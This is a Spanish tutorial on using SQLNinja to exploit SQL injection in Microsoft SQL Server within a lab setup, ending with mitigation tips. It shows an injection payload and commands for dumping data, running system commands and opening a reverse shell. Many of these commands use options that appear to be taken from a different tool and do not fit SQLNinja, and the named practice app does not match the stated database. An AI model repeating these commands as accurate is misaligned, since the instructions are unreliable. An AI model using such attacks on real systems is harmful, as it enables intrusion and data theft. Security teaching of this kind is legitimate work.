### Técnica: Uso de **SQLNinja** para detectar y explotar vulnerabilidades de inyección SQL

#### ¿Qué es SQLNinja?

**SQLNinja** es una herramienta especializada en la explotación de inyecciones SQL en bases de datos Microsoft SQL Server. Su objetivo principal es automatizar la explotación de este tipo de vulnerabilidades y obtener acceso al servidor.

### Paso 1: Instalación y configuración de SQLNinja

En Kali Linux, **SQLNinja** suele venir preinstalado. Si no lo tienes, puedes instalarlo fácilmente desde los repositorios de Kali.

1. Instalar SQLNinja

    (si no está instalado):

   ```bash
   sudo apt-get update
   sudo apt-get install sqlninja
   ```

### Paso 2: Preparación de la aplicación vulnerable

Para esta práctica, utilizaremos una aplicación web vulnerable (puedes usar Badstore o cualquier otra aplicación vulnerable que uses en tu entorno de pruebas). Asegúrate de que la aplicación esté corriendo en el servidor y que la base de datos sea Microsoft SQL Server. Si no es SQL Server, SQLNinja no funcionará.

### Paso 3: Verificar la vulnerabilidad con SQLNinja

1. **Obtener una URL vulnerable**:

   - Navega a la aplicación web que estás probando y encuentra una página que realice consultas a la base de datos basadas en la entrada del usuario (por ejemplo, un formulario de búsqueda de productos).

   - Una vez que encuentres un campo vulnerable a la inyección SQL, usa un payload simple como:

     ```bash
     ' OR 1=1--
     ```

   - Si el sitio devuelve resultados inesperados o accesos no autorizados, es probable que sea vulnerable.

2. **Ejecutar SQLNinja**:

   - Abre una terminal en Kali Linux y ejecuta 

     SQLNinja

     . La estructura básica del comando es la siguiente:

     ```bash
     sqlninja -u "http://localhost/vulnerable_page.php?id=1" -v
     ```

   - En este caso, reemplaza la URL con la ruta específica de tu aplicación vulnerable.

   - La opción `-v` habilita el modo verbose para que puedas ver más detalles sobre lo que SQLNinja está haciendo.

### Paso 4: Explotar la vulnerabilidad

SQLNinja tiene varias funciones para explotar vulnerabilidades de inyección SQL en Microsoft SQL Server. Algunos de los principales ataques que puedes realizar son:

#### 1. **Obtener información de la base de datos**

- **SQLNinja** puede extraer información del sistema de base de datos, como las tablas, columnas y registros. Una vez que hayas identificado la vulnerabilidad, SQLNinja puede obtener toda esta información.

- Para listar las bases de datos disponibles:

  ```sql
  sqlninja -u "http://localhost/vulnerable_page.php?id=1" --dbs
  ```

#### 2. **Enumerar las tablas y columnas**

- Una vez que tengas acceso a la base de datos, puedes listar las tablas y las columnas dentro de esas tablas. Para hacerlo:

  ```sql
  sqlninja -u "http://localhost/vulnerable_page.php?id=1" --tables
  ```

#### 3. **Obtener datos sensibles (extracción de registros)**

- Si deseas extraer datos específicos (por ejemplo, usuarios o contraseñas) de una tabla en particular, puedes usar SQLNinja para seleccionar y extraer los registros:

  ```sql
  sqlninja -u "http://localhost/vulnerable_page.php?id=1" --dump
  ```

#### 4. **Escalar privilegios**

- SQLNinja también tiene módulos para intentar obtener permisos más altos en la base de datos y ejecutar comandos del sistema directamente en el servidor de la base de datos, dependiendo de los permisos del usuario comprometido.

- Puedes usarlo para ejecutar comandos del sistema si el servidor SQL tiene permisos administrativos:

  ```sql
  sqlninja -u "http://localhost/vulnerable_page.php?id=1" --os-cmd "net user"
  ```

#### 5. **Explotar la vulnerabilidad para obtener una shell inversa**

- Uno de los usos más peligrosos de SQLNinja es obtener una shell en el sistema a través de la vulnerabilidad de inyección SQL. Si puedes escalar privilegios, puedes intentar una shell inversa para tener control total sobre el servidor.

- El comando para lanzar una shell inversa es:

  ```sql
  sqlninja -u "http://localhost/vulnerable_page.php?id=1" --reverse-shell
  ```

### Paso 5: Mitigación de la inyección SQL

1. **Usar consultas preparadas**: Siempre utiliza **consultas preparadas** o **parametrizadas** en lugar de construir consultas SQL dinámicas con la entrada del usuario.
2. **Validar las entradas del usuario**: Implementa una validación estricta en todas las entradas del usuario. No permitas caracteres especiales como comillas o guiones que se utilizan en ataques SQL.
3. **Escapar las entradas del usuario**: Si no puedes usar consultas preparadas, asegúrate de escapar adecuadamente los caracteres especiales antes de incluir las entradas del usuario en consultas SQL.
4. **Configurar permisos mínimos**: Asegúrate de que las cuentas de base de datos utilizadas por tu aplicación web tengan los permisos mínimos necesarios para realizar sus operaciones. Evita usar cuentas con permisos administrativos en la base de datos.
5. **Auditorías y pruebas regulares**: Realiza auditorías regulares de seguridad y pruebas de penetración para identificar y corregir vulnerabilidades antes de que sean explotadas.
